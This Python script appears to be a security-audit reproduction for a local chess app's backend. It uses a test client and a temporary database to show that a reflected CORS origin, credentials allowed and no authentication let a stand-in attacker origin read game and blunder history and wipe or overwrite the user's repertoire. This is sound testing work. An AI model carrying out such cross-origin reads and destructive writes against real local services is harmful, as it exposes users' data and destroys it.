#!/usr/bin/env python3
"""
ATK5-07 repro: cross-origin attack surface.

The backend binds 127.0.0.1:38281 and has NO authentication of any kind, but
CORSMiddleware is configured with allow_origins=["*"] + allow_credentials=True.
Starlette therefore *reflects* any request Origin and marks the response
credentialed. A plain http:// attacker page can therefore read AND write the
user's local chess app:

  * read  /api/games/recent   -> opponent usernames, ratings, opening names
  * read  /api/blunders       -> full blunder history (limit is unbounded)
  * read  /api/repertoire/tree-> personal repertoire / study names
  * WRITE /api/repertoire/clear      -> destroys the user's repertoire  (data loss)
  * WRITE /api/settings              -> overwrites Lichess token/username
  * WRITE /api/repertoire/seed?force=true -> overwrites the user's prepared moves

This probe demonstrates the CORS reflection + preflight + the destructive write,
using TestClient only (never touches port 38281 or the production DB).

Idempotent, isolated temp DB.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

import tests.test_setup  # MUST be first backend-adjacent import

from backend.api import app  # noqa: E402
from fastapi.testclient import TestClient  # noqa: E402

START_N = "rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq -"
EVIL = "http://attacker.example"
c = TestClient(app, raise_server_exceptions=False)
H = {"Origin": EVIL}

print("=" * 78)
print("1) CORS preflight for the destructive endpoint, from a foreign origin")
print("=" * 78)
r = c.request("OPTIONS", "/api/repertoire/clear", headers={
    **H, "Access-Control-Request-Method": "POST", "Access-Control-Request-Headers": "content-type"})
print("  status:", r.status_code)
for k, v in r.headers.items():
    if k.lower().startswith("access-control"):
        print(f"   {k}: {v}")

print()
print("=" * 78)
print("2) Any origin is reflected + credentials allowed (not '*', which would be safe)")
print("=" * 78)
for origin in ["http://attacker.example", "http://localhost:1337", "https://evil.test",
               "null", "http://169.254.169.254"]:
    r = c.get("/api/dashboard", headers={"Origin": origin})
    acao = r.headers.get("access-control-allow-origin")
    acac = r.headers.get("access-control-allow-credentials")
    print(f"  Origin={origin:<30} -> ACAO={acao!r:<32} ACAC={acac!r}")

print()
print("=" * 78)
print("3) READ chain: a hostile page can exfiltrate the user's chess history")
print("=" * 78)
r = c.get("/api/games/recent?limit=5", headers=H)
js = r.json()
print("  /api/games/recent ->", r.status_code, "total games:", js.get("total"))
if js.get("games"):
    g = js["games"][0]
    print("   sample record keys:", sorted(g.keys()))
    print("   opponent_name:", g.get("opponent_name"), "rating:", g.get("opponent_rating"),
          "opening:", g.get("opening_name"))
r = c.get("/api/blunders?limit=-1", headers=H)
print("  /api/blunders?limit=-1 ->", r.status_code, "rows returned:", len(r.json()),
      "(unbounded; negative LIMIT == no limit in SQLite)")
r = c.get("/api/repertoire/studies", headers=H)
print("  /api/repertoire/studies ->", r.status_code, r.text[:200])

print()
print("=" * 78)
print("4) WRITE chain: destroy the repertoire from a foreign origin (temp DB)")
print("=" * 78)
c.post("/api/repertoire/move", json={"repertoire": "white", "parent_fen": START_N,
                                     "move_uci": "e2e4", "is_user_move": True})
conn_count = __import__("backend.db", fromlist=["get_db"]).get_db()
cur = conn_count.cursor()
cur.execute("SELECT COUNT(*) FROM repertoire_moves")
print("  repertoire_moves before:", cur.fetchone()[0])
conn_count.close()

r = c.post("/api/repertoire/clear", headers=H, json=None)   # no auth, no token, no CSRF proof
print("  POST /api/repertoire/clear (no credentials) ->", r.status_code, r.text[:120])
conn_count = __import__("backend.db", fromlist=["get_db"]).get_db()
cur = conn_count.cursor()
cur.execute("SELECT COUNT(*) FROM repertoire_moves")
print("  repertoire_moves after :", cur.fetchone()[0])
conn_count.close()

print()
print("  and the seeding endpoint that overwrites prepared moves (AGENTS.md §9 warns about this):")
r = c.post("/api/repertoire/seed?force=true", headers=H)
print("  POST /api/repertoire/seed?force=true (no auth) ->", r.status_code, r.text[:200])
conn_count = __import__("backend.db", fromlist=["get_db"]).get_db()
cur = conn_count.cursor()
cur.execute("SELECT COUNT(*) FROM repertoire_moves")
print("  repertoire_moves after force-seed:", cur.fetchone()[0])
conn_count.close()

print()
print("=" * 78)
print("5) Is there ANY authn/authz in the app? grep for dependencies")
print("=" * 78)
import re  # noqa: E402
ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
src = open(os.path.join(ROOT, "backend", "api.py")).read()
for kw in ["Depends(", "Security(", "HTTPBearer", "APIKeyHeader", "OAuth2", "Authorization",
           "api_key", "require_auth", "Depends(verify"]:
    print(f"  {kw:<18} occurrences in backend/api.py: {src.count(kw)}")
print("  -> no route declares any auth dependency.")

print()
print("=" * 78)
print("6) Security headers present on a static response?")
print("=" * 78)
r = c.get("/", headers=H)
for k, v in r.headers.items():
    print(f"  {k}: {v}")
for h in ["x-content-type-options", "x-frame-options", "content-security-policy",
          "strict-transport-security", "referrer-policy", "permissions-policy",
          "cross-origin-opener-policy", "x-xss-protection"]:
    print(f"  MISSING? {h}: {r.headers.get(h, '<<ABSENT>>')}")

print()
print("DONE")
